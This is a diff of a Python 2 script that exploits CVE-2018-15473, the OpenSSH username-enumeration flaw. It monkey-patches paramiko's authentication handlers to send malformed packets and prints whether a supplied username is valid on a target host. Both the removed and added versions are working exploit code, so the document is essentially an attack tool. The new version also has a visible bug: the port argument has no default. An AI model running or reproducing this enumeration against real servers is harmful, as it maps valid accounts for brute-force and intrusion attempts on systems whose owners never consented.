@@ -1,65 +1,69 @@
 #!/usr/bin/env python
-
 # Descubre en remoto usuario existente valido SSH
+# CVE-2018-15473 SSH User Enumeration by hackingyseguridad.com (@hackyseguridad) https://hackingyseguridad.com.github.io
 
-import argparse
-import logging
-import paramiko
-import socket
-import sys
+import argparse, logging, paramiko, socket, sys, os, warnings
 
+# comment this out for debugging purposes
+if not sys.warnoptions:
+    warnings.simplefilter("ignore")
 
 class InvalidUsername(Exception):
     pass
 
-
+# malicious function to malform packet
 def add_boolean(*args, **kwargs):
     pass
 
-
-old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[
+# function that'll be overwritten to malform the packet
+old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[
         paramiko.common.MSG_SERVICE_ACCEPT]
 
+# malicious function to overwrite MSG_SERVICE_ACCEPT handler
 def service_accept(*args, **kwargs):
     paramiko.message.Message.add_boolean = add_boolean
     return old_service_accept(*args, **kwargs)
 
-
-def userauth_failure(*args, **kwargs):
+# call when username was invalid 
+def invalid_username(*args, **kwargs):
     raise InvalidUsername()
 
+# assign functions to respective handlers
+paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
+paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username
 
-paramiko.auth_handler.AuthHandler._handler_table.update({
-    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
-    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
-})
+# perform authentication with malicious packet and username
+def check_user(username):
+    sock = socket.socket()
+    sock.connect((args.target, int(args.port)))
+    transport = paramiko.transport.Transport(sock)
 
+    try:
+        transport.start_client()
+    except paramiko.ssh_exception.SSHException:
+        print '[!] Failed to negotiate SSH transport'
+        sys.exit(2)
+
+    try:
+        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
+    except InvalidUsername:
+        print "[-] " + args.target + ":" + args.port + ": {} is an invalid username".format(username)
+        sys.exit(3)
+    except paramiko.ssh_exception.AuthenticationException:
+        print "[+] " + args.target + ":" + args.port + ": {} is a valid username".format(username)
+
+# remove paramiko logging
 logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
 
-arg_parser = argparse.ArgumentParser()
-arg_parser.add_argument('hostname', type=str)
-arg_parser.add_argument('--port', type=int, default=22)
-arg_parser.add_argument('username', type=str)
-args = arg_parser.parse_args()
+parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
+parser.add_argument('target', help="IP address of the target system")
+parser.add_argument('-p', '--port', help="Set port of SSH service")
+parser.add_argument('username', help="Username to check for validity.")
 
-sock = socket.socket()
-try:
-    sock.connect((args.hostname, args.port))
-except socket.error:
-    print '[-] Failed to connect'
+if len(sys.argv) == 1:
+    parser.print_help()
     sys.exit(1)
 
-transport = paramiko.transport.Transport(sock)
-try:
-    transport.start_client()
-except paramiko.ssh_exception.SSHException:
-    print '[-] Failed to negotiate SSH transport'
-    sys.exit(2)
+args = parser.parse_args()
 
-try:
-    transport.auth_publickey(args.username, paramiko.RSAKey.generate(2048))
-except InvalidUsername:
-    print '[*] Usuario inexistente'
-    sys.exit(3)
-except paramiko.ssh_exception.AuthenticationException:
-    print '[+] Usuario valido'
+check_user(args.username)
